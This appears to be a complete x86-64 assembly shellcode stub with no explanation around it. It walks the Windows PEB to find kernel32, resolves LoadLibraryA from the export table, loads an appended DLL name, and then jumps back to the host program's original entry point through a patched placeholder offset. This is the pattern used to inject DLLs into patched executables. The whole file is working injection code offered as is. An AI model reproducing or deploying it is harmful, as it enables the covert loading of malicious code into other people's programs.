	bits 64	
	section	.text

	; save original registers
	push rdx
	push r8
	push r9
	call main
main:
	pop r9
	sub r9, main

	mov rax, gs:[0x60]		; PEB
	mov rax, [rax + 0x18]		; PEB->Ldr
	mov rsi, [rax + 0x10]		; PEB->Ldr.InMemoryOrderModuleList
	mov r13, rsi			; save first module for later
	lodsq				; rax = ntdll.dll
	xchg rax, rsi
	lodsq				; rax = kernel32.dll
	mov rbx, [rax + 0x30]		; rbx = dllbase

	xor rax, rax
	mov eax, [rbx + 0x3c]		; rax = DOS->e_lfanew
	add rax, rbx			; rax = PE Header

	xor rdx, rdx
	mov edx, [rax + 0x88]		; edx = Offset export table
	add rdx, rbx			; rdx = Export table

	xor rsi, rsi
	mov esi, [rdx + 0x20]		; rsi = Offset namestable
	add rsi, rbx			; rsi = Names table

	xor rcx, rcx

findfun:
	inc rcx				; increment ordinal
	xor rax, rax
	lodsd				; get name offset
	add rax, rbx			; get fun name
	cmp dword [rax], 0x64616F4C	; Load
	jnz findfun
	cmp dword [rax + 0x4], 0x7262694C ; Libr
	jnz findfun
	cmp dword [rax + 0x8], 0x41797261 ; aryA
	jnz findfun

	xor rsi, rsi
	mov esi, [rdx + 0x24]		; rsi = Offset ordinals
	add rsi, rbx			; rsi = Ordinals table

	mov cx, [rsi + rcx * 2]		; Number of function
	dec rcx

	xor rsi, rsi
	mov esi, [rdx + 0x1c]		; Offset address table
	add rsi, rbx			; rsi = Address table

	xor rdx, rdx
	mov edx, [rsi + rcx * 4]	; edx = Pointer(offset)
	add rdx, rbx			; rdx = LoadLibraryA

	add r9, dllname
	mov rcx, r9
	sub rsp, 0x8
	call rdx			; LoadLibraryA
	add rsp, 0x8

	; restore original registers
	pop r9
	pop r8
	pop rdx
	; get the current ImageBase
	mov rcx, [r13 + 0x30]
	mov rbx, 0xAAAAAAAAAAAAAAAA
	add rcx, rbx
	push rcx
	ret

dllname:
